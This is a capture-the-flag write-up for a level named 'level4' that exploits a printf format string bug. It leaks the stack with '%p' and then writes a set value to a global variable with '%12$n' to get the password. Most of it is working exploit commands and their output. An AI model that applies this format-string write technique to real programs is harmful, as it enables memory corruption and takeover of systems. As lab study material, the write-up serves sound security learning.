# Level 4

## Initial Context

- One file: `level4`

## Solving the Challenge

Its the same challenge as `level3`, but using the 12th argument instead.

The `m` variable is at `0x08049810` (or `10 98 04 08` in LE).

```bash
$ python -c 'print "\x10\x98\x04\x08" + "%p " * 13' | ./level4
?? 0x 0x 0x 0x 0x 0x 0x 0x 0x 0x 0x 0x8049810 0x
#                                   ^ bingo
```

The value that `m` must be equals to is `0x1025544` or `16930116`.

Since the program only reads `512 bytes`, we need to use `printf`'s identifiers' minimum field width:

```python
# address
"\x10\x98\x04\x08"

# padding to produce 16930116 characters
+ "%16930112x"

# write using %n, at the forth argument using $4
+ "%12$n"
```

The program will `cat` the password for us, so no need to save the payload into a file, we can send it directly to the vulnerable program:

```bash
python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"' | ./level4
...b7ff26b0
<flag>
```
